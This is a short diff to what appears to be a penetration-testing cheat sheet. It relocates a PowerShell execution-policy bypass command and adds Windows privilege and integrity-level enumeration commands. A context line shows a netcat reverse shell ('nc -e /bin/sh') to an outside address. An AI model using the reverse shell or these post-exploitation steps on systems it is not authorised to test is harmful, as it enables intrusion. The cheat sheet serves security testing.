@@ -148,6 +148,11 @@ nc -e /bin/sh 10.0.0.1 1234
 
 #### PowerShell
 
+##### Run PowerShell in Bypass mode
+```powershell
+powershell -ep bypass
+```
+
 ##### Get system info
 ```powershell
 systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" 
@@ -166,6 +171,14 @@ whoami /groups
 ##### Get user's privileges
 ```powershell
 whoami /priv
+```
+
+##### Get user's integrity level
+```powershell
+# Ensure correct module is in use
+Import-Module NtObjectManager
+
+Get-NtTokenIntegrityLevel
 ```
 
 ##### Get existing groups on a machine
@@ -278,12 +291,6 @@ runAs /user:<user> <command>
 ```powershell
 Start-Process powershell.exe -Verb runAs
 ```
-
-##### Set ExecutionPolicy to Bypass
-```powershell
-powershell -ep bypass
-```
-
 
 ##### Default config files
 
